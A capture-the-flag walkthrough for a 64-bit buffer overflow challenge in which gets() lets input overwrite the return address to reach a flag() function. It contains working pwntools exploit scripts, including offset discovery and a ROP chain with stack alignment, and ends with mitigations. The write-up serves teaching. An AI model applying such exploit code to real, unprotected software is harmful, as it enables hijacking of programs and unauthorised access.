# X-Sixty-What (64-bit Buffer Overflow) - CTF Walkthrough

## Challenge Overview
Classic buffer overflow to redirect execution to a `flag()` function.

## Binary Info
```
Arch: x86-64 (64-bit)
Protections: NX only
PIE: Disabled
Canary: Disabled
```

## Vulnerability

```c
void vuln(){
  char buf[BUFFSIZE];  // 64 bytes
  gets(buf);           // UNBOUNDED INPUT!
}
```

The `gets()` function has no bounds checking - we can overflow the buffer and overwrite the return address.

## Target

```c
void flag() {
  // Reads and prints flag.txt
}
```

We need to redirect execution to the `flag()` function.

## Exploitation Steps

### Step 1: Find Offset to Return Address

```python
from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

# Generate cyclic pattern
pattern = cyclic(1000)
p.sendline(pattern)
p.wait()

# Find offset from crash
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print(f"Offset: {offset}")  # Result: 72 bytes
```

The offset is **72 bytes** to reach the return address.

### Step 2: Find flag() Address

```bash
objdump -d vuln | grep flag
# Or
readelf -s vuln | grep flag
```

Get the address of the `flag()` function (e.g., `0x401156`).

### Step 3: Build ROP Chain

In 64-bit, we need proper stack alignment. Use ROP:

```python
from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

# Build ROP chain
rop = ROP(elf)
rop.raw(b'A' * 72)  # Padding to return address
rop.flag()          # Call flag function

# Send payload
p.sendline(rop.chain())
p.interactive()
```

## Complete Exploit

```python
from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

# Method 1: Using ROP (handles alignment)
offset = b'A' * 72
rop = ROP(elf)
rop.raw(offset)
rop.flag()
p.sendline(rop.chain())

# Method 2: Manual (may have alignment issues)
# flag_addr = elf.symbols['flag']
# payload = b'A' * 72 + p64(flag_addr)
# p.sendline(payload)

p.interactive()
```

## 64-bit vs 32-bit Differences

**32-bit**: Simple address overwrite works
```python
payload = padding + p32(function_address)
```

**64-bit**: Need stack alignment (16-byte boundary)
```python
# May need a RET gadget for alignment
rop.raw(rop.find_gadget(['ret']).address)  # Align
rop.flag()                                  # Call function
```

ROP automatically handles this.

## Key Concepts
- **Buffer Overflow**: `gets()` allows unlimited input
- **Return Address**: Stored at `RBP + 8` on 64-bit
- **ROP**: Return-Oriented Programming for proper execution
- **Stack Alignment**: 64-bit requires 16-byte aligned stack

## Quick Commands

```bash
# Find offset
python3 -c "from pwn import *; print(cyclic(100))" | ./vuln
# Then check crash in gdb

# Get flag address
readelf -s vuln | grep flag

# Run exploit
python3 exploit.py
```

## Mitigation
1. Never use `gets()` - use `fgets(buf, size, stdin)`
2. Enable stack canaries: `-fstack-protector-all`
3. Enable PIE: `-fPIE -pie`
4. Use modern compilers with default protections
